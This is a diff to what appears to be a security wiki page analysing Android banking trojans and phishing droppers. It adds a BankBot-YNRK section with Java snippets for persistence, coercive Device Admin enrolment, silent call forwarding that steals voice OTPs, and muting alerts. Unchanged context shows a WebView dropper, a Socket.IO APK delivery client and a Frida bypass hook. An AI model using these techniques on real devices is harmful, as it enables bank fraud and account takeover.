@@ -63,6 +63,9 @@
 
 ## Useful Frida Snippet: Auto-Bypass Invitation Code
 
+<details>
+<summary>Frida hook to bypass invitation code</summary>
+
 ```python
 # frida -U -f com.badapp.android -l bypass.js --no-pause
 # Hook HttpURLConnection write to always return success
@@ -81,6 +84,8 @@ Java.perform(function() {
   };
 });
 ```
+
+</details>
 
 ## Indicators (Generic)
 
@@ -145,7 +150,7 @@ Minimal loader:
 ```java
 WebView wv = findViewById(R.id.web);
 wv.getSettings().setJavaScriptEnabled(true);
-wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
+wv.loadUrl(upiPage); // ex: https://`<replit-app>`/gate.htm
 ```
 
 ### Self-propagation and SMS/OTP interception
@@ -228,9 +233,12 @@ Attackers increasingly replace static APK links with a Socket.IO/WebSocket chann
 
 Typical client flow observed in the wild:
 
+<details>
+<summary>Socket.IO client flow assembling APK in the browser</summary>
+
 ```javascript
 // Open Socket.IO channel and request payload
-const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
+const socket = io("wss://`<lure-domain>`/ws", { transports: ["websocket"] });
 socket.emit("startDownload", { app: "com.example.app" });
 
 // Accumulate binary chunks and drive fake Play progress UI
@@ -247,6 +255,8 @@ socket.on("downloadComplete", () => {
   document.body.appendChild(a); a.click();
 });
 ```
+
+</details>
 
 Why it evades simple controls:
 - No static APK URL is exposed; payload is reconstructed in memory from WebSocket frames.
@@ -265,6 +275,59 @@ See also WebSocket tradecraft and tooling:
 {{#endref}}
 
 
+## Accessibility-driven banker TTPs: JobScheduler + Device Admin + MMI call forwarding (BankBot‑YNRK)
+
+The Android/BankBot‑YNRK banker shows a compact stack for durable control and on‑device fraud via Accessibility. Key reusable traits:
+
+- Bootstrap & scope
+  - Target Android ≤ 13 where Accessibility can still auto‑drive permission flows; deep‑link Accessibility Settings and auto‑accept prompts. See:
+
+{{#ref}}
+../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
+{{#endref}}
+
+- Persistence via JobScheduler + Device Admin
+  - Schedule a persisted job (survives reboot) to regularly re‑kick background tasks:
+    ```java
+    ComponentName svc = new ComponentName(ctx, JobHandlerService.class);
+    JobInfo ji = new JobInfo.Builder(1337, svc)
+      .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
+      .setPersisted(true)
+      .setMinimumLatency(30_000)
+      .setBackoffCriteria(30_000, JobInfo.BACKOFF_POLICY_LINEAR)
+      .build();
+    ctx.getSystemService(JobScheduler.class).schedule(ji);
+    ```
+  - Enrol as Device Admin to harden removal and regain control after reboot:
+    ```java
+    Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+    i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(ctx, AdminReceiver.class));
+    i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable advanced protections");
+    ctx.startActivity(i);
+    ```
+
+- Silent OTP interception via call forwarding (MMI/USSD)
+  - Programmatically dial MMI to enable unconditional call forwarding, diverting voice OTPs to an attacker‑controlled number:
+    ```java
+    // Requires CALL_PHONE; behaviour varies by carrier/OEM
+    String mmi = "**21*" + number + "#";
+    Intent call = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + Uri.encode(mmi)));
+    ctx.startActivity(call);
+    ```
+
+- C2 & traffic
+  - Stage‑based HTTP tasking (e.g., on `:8181`) exchanging device/app context and target package lists; optional WebSocket/WebRTC (Janus on `:8989`) for interactive control.
+
+- Anti‑analysis & stealth
+  - Fingerprint vendor/ROM/emulator at init (`android.os.Build` fields, model→resolution maps) to gate execution.
+  - Suppress audible cues by muting multiple AudioManager streams when sensitive actions run:
+    ```java
+    AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
+    int[] S = {AudioManager.STREAM_MUSIC, AudioManager.STREAM_RING, AudioManager.STREAM_NOTIFICATION};
+    for (int s: S) am.setStreamVolume(s, 0, 0);
+    ```
+
+
 ## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study
 
 The RatOn banker/RAT campaign (ThreatFabric) is a concrete example of how modern mobile phishing operations blend WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, and even NFC-relay orchestration. This section abstracts the reusable techniques.
@@ -273,6 +336,9 @@ The RatOn banker/RAT campaign (ThreatFabric) is a concrete example of how modern
 Attackers present a WebView pointing to an attacker page and inject a JavaScript interface that exposes a native installer. A tap on an HTML button calls into native code that installs a second-stage APK bundled in the dropper’s assets and then launches it directly.
 
 Minimal pattern:
+
+<details>
+<summary>WebView dropper that installs a second-stage payload from assets</summary>
 
 ```java
 public class DropperActivity extends Activity {
@@ -302,6 +368,8 @@ public class DropperActivity extends Activity {
   }
 }
 ```
+
+</details>
 
 HTML on the page:
 
@@ -440,5 +508,6 @@ Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new
 - [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
 - [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
 - [Socket.IO](https://socket.io)
+- [Investigation Report: Android/BankBot‑YNRK Mobile Banking Trojan (CYFIRMA)](https://www.cyfirma.com/research/investigation-report-android-bankbot-ynrk-mobile-banking-trojan/)
 
 {{#include ../../banners/hacktricks-training.md}}
